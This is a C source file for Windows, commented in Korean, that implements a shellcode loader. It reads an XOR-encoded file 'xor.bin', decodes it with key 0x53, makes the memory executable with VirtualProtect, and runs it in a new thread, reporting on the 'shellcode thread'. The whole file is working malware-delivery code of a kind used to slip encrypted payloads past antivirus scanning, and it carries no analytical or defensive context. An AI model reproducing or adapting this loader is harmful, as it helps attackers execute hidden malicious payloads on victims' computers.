#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

void decrypt_and_execute(const char *filename) {
    // 1. 파일 열기
    FILE *file = fopen(filename, "rb");
    if (!file) {
        perror("file open failed!");
        return;
    }

    // 2. 파일 크기 구하기
    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);
    rewind(file);

    // 3. 메모리 할당 (실행 권한 부여를 위해 VirtualAlloc 사용)
    void *exec_mem = VirtualAlloc(NULL, file_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!exec_mem) {
        printf("memory allocation failed! error code: %lu\n", GetLastError());
        fclose(file);
        return;
    }

    // 4. 파일 읽기
    size_t bytes_read = fread(exec_mem, 1, file_size, file);
    fclose(file);

    if (bytes_read != (size_t)file_size) {
        printf("file read failed!\n");
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        return;
    }

    // 5. 0x53으로 XOR 복호화 수행
    unsigned char *p = (unsigned char *)exec_mem;
    for (long i = 0; i < file_size; i++) {
        p[i] ^= 0x53;
    }

    // 6. 메모리 권한을 읽기/쓰기/실행(PAGE_EXECUTE_READ) 또는 PAGE_EXECUTE_READWRITE로 변경
    // * 주의: CreateThread로 실행할 때는 PAGE_EXECUTE_READ 또는 PAGE_EXECUTE_READWRITE 권한이 필요합니다.
    DWORD old_protect;
    if (!VirtualProtect(exec_mem, file_size, PAGE_EXECUTE_READWRITE, &old_protect)) {
        printf("memory permission change failed! error code: %lu\n", GetLastError());
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        return;
    }

    // 7. 스레드로 실행
    printf("decrypt complete! create and start thread...\n");
    
    // exec_mem은 LPTHREAD_START_ROUTINE 시그니처(DWORD WINAPI ThreadProc(LPVOID lpParam))와 일치해야 합니다.
    HANDLE th = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
    if (!th) {
        printf("CreateThread failed: %lu\n", GetLastError());
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        return;
    }

    // 스레드가 종료될 때까지 대기
    DWORD wait = WaitForSingleObject(th, INFINITE);

    if (wait == WAIT_TIMEOUT) {
        printf("shellcode thread still running\n");
    } else if (wait == WAIT_OBJECT_0) {
        DWORD code = 0;
        GetExitCodeThread(th, &code);
        printf("shellcode thread exit code: %lu\n", code);
    } else {
        printf("WaitForSingleObject failed: %lu\n", GetLastError());
    }

    // 스레드 종료 코드 확인
    DWORD code = 0;
    GetExitCodeThread(th, &code);
    printf("shellcode thread exit code: %lu\n", code);

    // 핸들 닫기
    CloseHandle(th);

    // 8. 메모리 해제
    // 주의: 스레드가 완전히 종료된(WaitForSingleObject 완료) 이후에 메모리를 해제해야 안전합니다.
    VirtualFree(exec_mem, 0, MEM_RELEASE);
}

int main() {
    decrypt_and_execute("xor.bin");
    return 0;
}